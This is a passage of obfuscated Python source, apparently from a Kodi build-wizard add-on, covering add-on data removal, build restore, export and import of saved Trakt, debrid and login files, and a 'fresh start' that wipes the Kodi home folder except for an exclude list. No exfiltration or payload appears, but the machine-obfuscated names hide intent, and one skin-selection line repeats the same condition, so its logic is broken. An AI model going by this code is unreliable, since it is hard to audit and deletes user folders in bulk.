		xbmc .sleep (1000 )#line:4648
		try :shutil .rmtree (O00O0OO0O0OOOO000 )#line:4649
		except Exception as O0O00O0O000O0O0O0 :wiz .log ("Error removing %s"%O0OOO0O0OO00O000O ,xbmc .LOGNOTICE )#line:4650
		removeAddonData (O0OOO0O0OO00O000O ,O0OO00OO0OOO0O000 ,over )#line:4651
	if over ==False :#line:4652
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OO00OO0OOO0O000 ))#line:4653
def removeAddonData (OO0OOO00O0O00O00O ,name =None ,over =False ):#line:4655
	if OO0OOO00O0O00O00O =='all':#line:4656
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4657
			wiz .cleanHouse (ADDOND )#line:4658
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4659
	elif OO0OOO00O0O00O00O =='uninstalled':#line:4660
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4661
			O0O0000O00OO0OOOO =0 #line:4662
			for O000OO00O0O0OOOO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4663
				OO0O0OO0O0O0000OO =O000OO00O0O0OOOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4664
				if OO0O0OO0O0O0000OO in EXCLUDES :pass #line:4665
				elif os .path .exists (os .path .join (ADDONS ,OO0O0OO0O0O0000OO )):pass #line:4666
				else :wiz .cleanHouse (O000OO00O0O0OOOO0 );O0O0000O00OO0OOOO +=1 ;wiz .log (O000OO00O0O0OOOO0 );shutil .rmtree (O000OO00O0O0OOOO0 )#line:4667
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0000O00OO0OOOO ))#line:4668
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4669
	elif OO0OOO00O0O00O00O =='empty':#line:4670
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4671
			O0O0000O00OO0OOOO =wiz .emptyfolder (ADDOND )#line:4672
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O0000O00OO0OOOO ))#line:4673
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4674
	else :#line:4675
		O0O0O0OOO00O0O0O0 =os .path .join (USERDATA ,'addon_data',OO0OOO00O0O00O00O )#line:4676
		if OO0OOO00O0O00O00O in EXCLUDES :#line:4677
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4678
		elif os .path .exists (O0O0O0OOO00O0O0O0 ):#line:4679
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OOO00O0O00O00O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4680
				wiz .cleanHouse (O0O0O0OOO00O0O0O0 )#line:4681
				try :#line:4682
					shutil .rmtree (O0O0O0OOO00O0O0O0 )#line:4683
				except :#line:4684
					wiz .log ("Error deleting: %s"%O0O0O0OOO00O0O0O0 )#line:4685
			else :#line:4686
				wiz .log ('Addon data for %s was not removed'%OO0OOO00O0O00O00O )#line:4687
	wiz .refresh ()#line:4688
def restoreit (O00OOOOOO0000O0OO ):#line:4690
	if O00OOOOOO0000O0OO =='build':#line:4691
		OO000OOO0O0000OOO =freshStart ('restore')#line:4692
		if OO000OOO0O0000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4693
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4694
		wiz .skinToDefault ()#line:4695
	wiz .restoreLocal (O00OOOOOO0000O0OO )#line:4696
def restoreextit (OOO0000OOO0O00O00 ):#line:4698
	if OOO0000OOO0O00O00 =='build':#line:4699
		OOOO0OO0O00OOO0O0 =freshStart ('restore')#line:4700
		if OOOO0OO0O00OOO0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4701
	wiz .restoreExternal (OOO0000OOO0O00O00 )#line:4702
def buildInfo (O0O0O0OO0OOOO0OOO ):#line:4704
	if wiz .workingURL (SPEEDFILE )==True :#line:4705
		if wiz .checkBuild (O0O0O0OO0OOOO0OOO ,'url'):#line:4706
			O0O0O0OO0OOOO0OOO ,O000O00O0O0OO0OO0 ,O0O000O0OOOOO0OOO ,OO0O000OOOO0OOO00 ,O00O0OOOO000000OO ,O0O0OO0OO000O000O ,O0O00O0000OO0OO0O ,O00O000O0000O0OOO ,O0OO0O0OO0OO0000O ,O00OO0OO0O0OO0OOO ,O00OO0OOOO00O0O0O =wiz .checkBuild (O0O0O0OO0OOOO0OOO ,'all')#line:4707
			O00OO0OO0O0OO0OOO ='Yes'if O00OO0OO0O0OO0OOO .lower ()=='yes'else 'No'#line:4708
			OO0O00O000OOO0O0O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0O0OO0OOOO0OOO )#line:4709
			OO0O00O000OOO0O0O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000O00O0O0OO0OO0 )#line:4710
			if not O0O0OO0OO000O000O =="http://":#line:4711
				O000O0O0O0OO00OOO =wiz .themeCount (O0O0O0OO0OOOO0OOO ,False )#line:4712
				OO0O00O000OOO0O0O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O000O0O0O0OO00OOO ))#line:4713
			OO0O00O000OOO0O0O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0OOOO000000OO )#line:4714
			OO0O00O000OOO0O0O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OO0OO0O0OO0OOO )#line:4715
			OO0O00O000OOO0O0O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OO0OOOO00O0O0O )#line:4716
			wiz .TextBox (ADDONTITLE ,OO0O00O000OOO0O0O )#line:4717
		else :wiz .log ("Invalid Build Name!")#line:4718
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4719
def buildVideo (O0OO00000O0O0O000 ):#line:4721
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4722
	if wiz .workingURL (SPEEDFILE )==True :#line:4723
		OO0OOOOO0OOO0OO00 =wiz .checkBuild (O0OO00000O0O0O000 ,'preview')#line:4724
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O0OO00000O0O0O000 )#line:4725
		if OO0OOOOO0OOO0OO00 and not OO0OOOOO0OOO0OO00 =='http://':playVideo (OO0OOOOO0OOO0OO00 )#line:4726
		else :wiz .log ("[%s]Unable to find url for video preview"%O0OO00000O0O0O000 )#line:4727
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4728
def dependsList (O00O00000O0O0000O ):#line:4730
	O0OOO0OO0OO0OOO00 =os .path .join (ADDONS ,O00O00000O0O0000O ,'addon.xml')#line:4731
	if os .path .exists (O0OOO0OO0OO0OOO00 ):#line:4732
		OO0OO00000O0OO0O0 =open (O0OOO0OO0OO0OOO00 ,mode ='r');O0O0O00OOOO0000O0 =OO0OO00000O0OO0O0 .read ();OO0OO00000O0OO0O0 .close ();#line:4733
		O00O0O0O00O000O00 =wiz .parseDOM (O0O0O00OOOO0000O0 ,'import',ret ='addon')#line:4734
		OO000000O00O0O0O0 =[]#line:4735
		for OO00OOO00O00OOO0O in O00O0O0O00O000O00 :#line:4736
			if not 'xbmc.python'in OO00OOO00O00OOO0O :#line:4737
				OO000000O00O0O0O0 .append (OO00OOO00O00OOO0O )#line:4738
		return OO000000O00O0O0O0 #line:4739
	return []#line:4740
def manageSaveData (O000000O000OOO00O ):#line:4742
	if O000000O000OOO00O =='import':#line:4743
		OOOOOO00O00O00OOO =os .path .join (ADDONDATA ,'temp')#line:4744
		if not os .path .exists (OOOOOO00O00O00OOO ):os .makedirs (OOOOOO00O00O00OOO )#line:4745
		O0O0000O00OO0O00O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4746
		if not O0O0000O00OO0O00O .endswith ('.zip'):#line:4747
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4748
			return #line:4749
		OOOOOO000000OOOOO =os .path .join (MYBUILDS ,'SaveData.zip')#line:4750
		OO0O000OOO0OO0O0O =xbmcvfs .copy (O0O0000O00OO0O00O ,OOOOOO000000OOOOO )#line:4751
		wiz .log ("%s"%str (OO0O000OOO0OO0O0O ))#line:4752
		extract .all (xbmc .translatePath (OOOOOO000000OOOOO ),OOOOOO00O00O00OOO )#line:4753
		O0000O0O0OO0OO0OO =os .path .join (OOOOOO00O00O00OOO ,'trakt')#line:4754
		O0O00OOOO0O00O00O =os .path .join (OOOOOO00O00O00OOO ,'login')#line:4755
		O0O00O00O000OOO00 =os .path .join (OOOOOO00O00O00OOO ,'debrid')#line:4756
		OO000OOOOO0OO0000 =0 #line:4757
		if os .path .exists (O0000O0O0OO0OO0OO ):#line:4758
			OO000OOOOO0OO0000 +=1 #line:4759
			OOOOOO0O00OO0OOO0 =os .listdir (O0000O0O0OO0OO0OO )#line:4760
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4761
			for OO000O000OO0O000O in OOOOOO0O00OO0OOO0 :#line:4762
				O0OO0O0OOOOO000O0 =os .path .join (traktit .TRAKTFOLD ,OO000O000OO0O000O )#line:4763
				O0O00OO0OO000OOO0 =os .path .join (O0000O0O0OO0OO0OO ,OO000O000OO0O000O )#line:4764
				if os .path .exists (O0OO0O0OOOOO000O0 ):#line:4765
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O000OO0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4766
					else :os .remove (O0OO0O0OOOOO000O0 )#line:4767
				shutil .copy (O0O00OO0OO000OOO0 ,O0OO0O0OOOOO000O0 )#line:4768
			traktit .importlist ('all')#line:4769
			traktit .traktIt ('restore','all')#line:4770
		if os .path .exists (O0O00OOOO0O00O00O ):#line:4771
			OO000OOOOO0OO0000 +=1 #line:4772
			OOOOOO0O00OO0OOO0 =os .listdir (O0O00OOOO0O00O00O )#line:4773
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4774
			for OO000O000OO0O000O in OOOOOO0O00OO0OOO0 :#line:4775
				O0OO0O0OOOOO000O0 =os .path .join (loginit .LOGINFOLD ,OO000O000OO0O000O )#line:4776
				O0O00OO0OO000OOO0 =os .path .join (O0O00OOOO0O00O00O ,OO000O000OO0O000O )#line:4777
				if os .path .exists (O0OO0O0OOOOO000O0 ):#line:4778
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O000OO0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4779
					else :os .remove (O0OO0O0OOOOO000O0 )#line:4780
				shutil .copy (O0O00OO0OO000OOO0 ,O0OO0O0OOOOO000O0 )#line:4781
			loginit .importlist ('all')#line:4782
			loginit .loginIt ('restore','all')#line:4783
		if os .path .exists (O0O00O00O000OOO00 ):#line:4784
			OO000OOOOO0OO0000 +=1 #line:4785
			OOOOOO0O00OO0OOO0 =os .listdir (O0O00O00O000OOO00 )#line:4786
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4787
			for OO000O000OO0O000O in OOOOOO0O00OO0OOO0 :#line:4788
				O0OO0O0OOOOO000O0 =os .path .join (debridit .REALFOLD ,OO000O000OO0O000O )#line:4789
				O0O00OO0OO000OOO0 =os .path .join (O0O00O00O000OOO00 ,OO000O000OO0O000O )#line:4790
				if os .path .exists (O0OO0O0OOOOO000O0 ):#line:4791
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO000O000OO0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4792
					else :os .remove (O0OO0O0OOOOO000O0 )#line:4793
				shutil .copy (O0O00OO0OO000OOO0 ,O0OO0O0OOOOO000O0 )#line:4794
			debridit .importlist ('all')#line:4795
			debridit .debridIt ('restore','all')#line:4796
		wiz .cleanHouse (OOOOOO00O00O00OOO )#line:4797
		wiz .removeFolder (OOOOOO00O00O00OOO )#line:4798
		os .remove (OOOOOO000000OOOOO )#line:4799
		if OO000OOOOO0OO0000 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4800
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4801
	elif O000000O000OOO00O =='export':#line:4802
		OOOO0OOOO00OOOOOO =xbmc .translatePath (MYBUILDS )#line:4803
		O00O0OO00OO0O0OOO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4804
		traktit .traktIt ('update','all')#line:4805
		loginit .loginIt ('update','all')#line:4806
		debridit .debridIt ('update','all')#line:4807
		O0O0000O00OO0O00O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4808
		O0O0000O00OO0O00O =xbmc .translatePath (O0O0000O00OO0O00O )#line:4809
		OOOO0O000O0O0O00O =os .path .join (OOOO0OOOO00OOOOOO ,'SaveData.zip')#line:4810
		OOO0000O00OO00OOO =zipfile .ZipFile (OOOO0O000O0O0O00O ,mode ='w')#line:4811
		for O0OO0OOOOOO00O0OO in O00O0OO00OO0O0OOO :#line:4812
			if os .path .exists (O0OO0OOOOOO00O0OO ):#line:4813
				OOOOOO0O00OO0OOO0 =os .listdir (O0OO0OOOOOO00O0OO )#line:4814
				for O0OOO00O00OO00OOO in OOOOOO0O00OO0OOO0 :#line:4815
					OOO0000O00OO00OOO .write (os .path .join (O0OO0OOOOOO00O0OO ,O0OOO00O00OO00OOO ),os .path .join (O0OO0OOOOOO00O0OO ,O0OOO00O00OO00OOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4816
		OOO0000O00OO00OOO .close ()#line:4817
		if O0O0000O00OO0O00O ==OOOO0OOOO00OOOOOO :#line:4818
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O000O0O0O00O ))#line:4819
		else :#line:4820
			try :#line:4821
				xbmcvfs .copy (OOOO0O000O0O0O00O ,os .path .join (O0O0000O00OO0O00O ,'SaveData.zip'))#line:4822
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0O0000O00OO0O00O ,'SaveData.zip')))#line:4823
			except :#line:4824
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0O000O0O0O00O ))#line:4825
def freshStart (install =None ,over =False ):#line:4830
	if USERNAME =='':#line:4831
		ADDON .openSettings ()#line:4832
		sys .exit ()#line:4833
	O0O0O00OO00OOO0OO =(SPEEDFILE )#line:4834
	(O0O0O00OO00OOO0OO )#line:4835
	O0O0O00O0OOOOO0O0 =(wiz .workingURL (O0O0O00OO00OOO0OO ))#line:4836
	(O0O0O00O0OOOOO0O0 )#line:4837
	if KEEPTRAKT =='true':#line:4838
		traktit .autoUpdate ('all')#line:4839
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4840
	if KEEPREAL =='true':#line:4841
		debridit .autoUpdate ('all')#line:4842
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4843
	if KEEPLOGIN =='true':#line:4844
		loginit .autoUpdate ('all')#line:4845
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4846
	if over ==True :O0OO00OOOO00000O0 =1 #line:4847
	elif install =='restore':O0OO00OOOO00000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4848
	elif install :O0OO00OOOO00000O0 =1 #line:4849
	else :O0OO00OOOO00000O0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4850
	if O0OO00OOOO00000O0 :#line:4851
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4852
			O0OO0O000OO0O0O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4853
			skinSwitch .swapSkins (O0OO0O000OO0O0O00 )#line:4856
			OOO0O00O000O0OOO0 =0 #line:4857
			xbmc .sleep (1000 )#line:4858
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0O00O000O0OOO0 <150 :#line:4859
				OOO0O00O000O0OOO0 +=1 #line:4860
				xbmc .sleep (1000 )#line:4861
				wiz .ebi ('SendAction(Select)')#line:4862
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4863
				wiz .ebi ('SendClick(11)')#line:4864
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4865
			xbmc .sleep (1000 )#line:4866
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4867
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4868
			return #line:4869
		wiz .addonUpdates ('set')#line:4870
		OOOOOO0O0O00O0000 =os .path .abspath (HOME )#line:4871
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4872
		O0000O00OO0OOOOO0 =sum ([len (OOO0O0OOOOO000OOO )for OO0OOO00O0OOOO000 ,OO0O0O000OO0OOOOO ,OOO0O0OOOOO000OOO in os .walk (OOOOOO0O0O00O0000 )]);O00OO0000OOOOO000 =0 #line:4873
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4874
		EXCLUDES .append ('My_Builds')#line:4875
		EXCLUDES .append ('archive_cache')#line:4876
		EXCLUDES .append ('script.module.requests')#line:4877
		EXCLUDES .append ('myfav.anon')#line:4878
		if KEEPREPOS =='true':#line:4879
			O0OOO0OO0OO0O0000 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4880
			for OOOOOOO0OOO0OO0OO in O0OOO0OO0OO0O0000 :#line:4881
				O0O0O00OO0O00O0O0 =os .path .split (OOOOOOO0OOO0OO0OO [:-1 ])[1 ]#line:4882
				if not O0O0O00OO0O00O0O0 ==EXCLUDES :#line:4883
					EXCLUDES .append (O0O0O00OO0O00O0O0 )#line:4884
		if KEEPSUPER =='true':#line:4885
			EXCLUDES .append ('plugin.program.super.favourites')#line:4886
		if KEEPMOVIELIST =='true':#line:4887
			EXCLUDES .append ('plugin.video.metalliq')#line:4888
		if KEEPMOVIELIST =='true':#line:4889
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4890
		if KEEPADDONS =='true':#line:4891
			EXCLUDES .append ('addons')#line:4892
		if KEEPTELEMEDIA =='true':#line:4893
			EXCLUDES .append ('plugin.video.telemedia')#line:4894
		EXCLUDES .append ('plugin.video.elementum')#line:4899
		EXCLUDES .append ('script.elementum.burst')#line:4900
		EXCLUDES .append ('script.elementum.burst-master')#line:4901
		EXCLUDES .append ('plugin.video.quasar')#line:4902
		EXCLUDES .append ('script.quasar.burst')#line:4903
		EXCLUDES .append ('skin.estuary')#line:4904
		if KEEPWHITELIST =='true':#line:4907
			OO0OO0O00O000OO0O =''#line:4908
			O0OOO0000O0O0000O =wiz .whiteList ('read')#line:4909
			if len (O0OOO0000O0O0000O )>0 :#line:4910
				for OOOOOOO0OOO0OO0OO in O0OOO0000O0O0000O :#line:4911
					try :O0O0O0OO000000OOO ,O00O000O0O00OO0OO ,O000OO000O0OO0O0O =OOOOOOO0OOO0OO0OO #line:4912
					except :pass #line:4913
					if O000OO000O0OO0O0O .startswith ('pvr'):OO0OO0O00O000OO0O =O00O000O0O00OO0OO #line:4914
					O0OOOO00O0O00OO00 =dependsList (O000OO000O0OO0O0O )#line:4915
					for OO000O0OO0000O00O in O0OOOO00O0O00OO00 :#line:4916
						if not OO000O0OO0000O00O in EXCLUDES :#line:4917
							EXCLUDES .append (OO000O0OO0000O00O )#line:4918
						OOOO0O0OOOOOOOOOO =dependsList (OO000O0OO0000O00O )#line:4919
						for O0O00O0OO0O00OO00 in OOOO0O0OOOOOOOOOO :#line:4920
							if not O0O00O0OO0O00OO00 in EXCLUDES :#line:4921
								EXCLUDES .append (O0O00O0OO0O00OO00 )#line:4922
					if not O000OO000O0OO0O0O in EXCLUDES :#line:4923
						EXCLUDES .append (O000OO000O0OO0O0O )#line:4924
				if not OO0OO0O00O000OO0O =='':wiz .setS ('pvrclient',O000OO000O0OO0O0O )#line:4925
		if wiz .getS ('pvrclient')=='':#line:4926
			for OOOOOOO0OOO0OO0OO in EXCLUDES :#line:4927
				if OOOOOOO0OOO0OO0OO .startswith ('pvr'):#line:4928
					wiz .setS ('pvrclient',OOOOOOO0OOO0OO0OO )#line:4929
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4930
		O00O00O00O000O0O0 =wiz .latestDB ('Addons')#line:4931
		for O0O0O0O00OO00O000 ,OOO0O00O00O0O0O00 ,O0OOO00OOOOOOOOO0 in os .walk (OOOOOO0O0O00O0000 ,topdown =True ):#line:4932
			OOO0O00O00O0O0O00 [:]=[OO00O00O0O00OOOO0 for OO00O00O0O00OOOO0 in OOO0O00O00O0O0O00 if OO00O00O0O00OOOO0 not in EXCLUDES ]#line:4933
			for O0O0O0OO000000OOO in O0OOO00OOOOOOOOO0 :#line:4934
				O00OO0000OOOOO000 +=1 #line:4935
				O000OO000O0OO0O0O =O0O0O0O00OO00O000 .replace ('/','\\').split ('\\')#line:4936
				OOO0O00O000O0OOO0 =len (O000OO000O0OO0O0O )-1 #line:4938
				if O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'script.skinshortcuts'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4939
				elif O0O0O0OO000000OOO =='MyVideos99.db'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4940
				elif O0O0O0OO000000OOO =='MyVideos107.db'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4941
				elif O0O0O0OO000000OOO =='MyVideos116.db'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4942
				elif O0O0O0OO000000OOO =='MyVideos99.db'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4943
				elif O0O0O0OO000000OOO =='MyVideos107.db'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4944
				elif O0O0O0OO000000OOO =='MyVideos116.db'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4945
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4946
				elif O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -2 ]=='userdata'and O000OO000O0OO0O0O [OOO0O00O000O0OOO0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O000OO000O0OO0O0O [OOO0O00O000O0OOO0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0O0O0O00OO00O000 ,O0O0O0OO000000OOO ),xbmc .LOGNOTICE )#line:4947
